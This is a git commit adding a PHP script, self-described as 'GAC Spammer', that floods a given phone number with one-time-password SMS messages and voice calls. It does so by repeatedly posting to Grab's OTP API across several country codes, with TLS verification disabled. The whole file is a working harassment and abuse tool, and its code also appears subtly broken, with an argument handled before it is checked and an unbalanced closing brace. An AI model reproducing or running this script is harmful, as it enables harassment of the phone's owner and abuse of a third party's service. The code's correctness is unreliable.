a42d1db8709d1b48373ff4d14ea3125308d69448
ximpossiblex <47664881+ximpossiblex@users.noreply.github.com>
2019-02-20 23:33:05 +0700

    Add files via upload

---
+++ SpV2.php
@@ -0,0 +1,41 @@
+<?php
+$argv[1] = substr($argv[1], 1);
+$argv[1] = "66".$argv[1];
+
+if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL", "ALL"]))) {
+	echo "php SpV2.php <PHONENUMBER> <SMS|CALL|ALL>";
+	exit;
+} elseif (!isset($argv[2])) {
+	$argv[2] = "SMS";
+}
+$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];
+shuffle($countries);
+$i = 0;
+foreach ($countries as $countryCode) {
+		$success = false;
+		while (!$success) {
+			foreach (["SMS", "CALL"] as $method) {
+				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
+					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([
+						"http" => [
+							"method" => "POST",
+							"header" => "Content-type: application/x-www-form-urlencoded",
+							"content" => "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
+						],
+						"ssl" => [
+							"verify_peer" => false,
+							"verify_peer_name" => false
+						]
+					]));
+					if ($result) {
+						echo $method." SUCCESS\n";
+						if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".++$i." Hits");
+						$success = true;
+					}
+				}
+			}
+		}
+	}
+}
+
+?>
